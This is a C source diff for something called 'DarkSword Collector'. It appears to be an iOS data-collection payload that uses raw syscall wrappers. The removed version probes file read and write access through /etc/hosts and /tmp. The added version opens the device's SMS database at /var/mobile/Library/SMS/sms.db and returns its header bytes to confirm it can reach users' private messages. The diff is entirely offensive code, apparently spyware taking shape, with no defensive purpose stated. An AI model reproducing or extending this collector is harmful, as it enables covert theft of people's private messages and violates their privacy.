@@ -1,6 +1,6 @@
 /**
- * DarkSword Collector v16 - Pure raw syscall diagnostics
- * Return value encodes diagnostic info
+ * DarkSword Collector v17 - Read SMS.db first 4 bytes
+ * Return: first 4 bytes of SMS.db as int (SQLite header = 0x53716C69 "Sqli")
  */
 
 static long _svc1(long n, long a) {
@@ -28,40 +28,16 @@ static long _svc3(long n, long a, long b, long c) {
 #define SYS_open  5
 #define SYS_read  3
 #define SYS_close 6
-#define SYS_write 4
 
 int ds_start(void) {
-    int result = 0;
-
-    /* Test 1: open /etc/hosts */
-    int fd = (int)_svc2(SYS_open, (long)"/etc/hosts", 0);
-    if (fd >= 0) {
-        result |= 0x100; /* open ok */
-        
-        /* Test 2: read */
-        char buf[16];
-        int n = (int)_svc3(SYS_read, fd, (long)buf, 16);
-        _svc1(SYS_close, fd);
-        
-        if (n > 0) {
-            result |= 0x200; /* read ok */
-            result |= (buf[0] & 0xFF); /* first byte */
-        } else {
-            result |= (n & 0xFF) << 16; /* read error code */
-        }
-    } else {
-        result |= (fd & 0xFF) << 16; /* open error code */
-    }
-
-    /* Test 3: write to /tmp */
-    int wfd = (int)_svc2(SYS_open, (long)"/tmp/ds_test.txt", 0x241);
-    if (wfd >= 0) {
-        result |= 0x400; /* write open ok */
-        const char *msg = "DS";
-        int wr = (int)_svc3(SYS_write, wfd, (long)msg, 2);
-        _svc1(SYS_close, wfd);
-        if (wr > 0) result |= 0x800; /* write ok */
-    }
-
-    return result;
+    int fd = (int)_svc2(SYS_open, (long)"/var/mobile/Library/SMS/sms.db", 0);
+    if (fd < 0) return 0xdead0000 | (-fd & 0xFFFF);
+    
+    unsigned char buf[4] = {0};
+    int n = (int)_svc3(SYS_read, fd, (long)buf, 4);
+    _svc1(SYS_close, fd);
+    
+    if (n < 4) return 0xbeef0000 | (n & 0xFFFF);
+    
+    return (int)buf[0] | ((int)buf[1] << 8) | ((int)buf[2] << 16) | ((int)buf[3] << 24);
 }
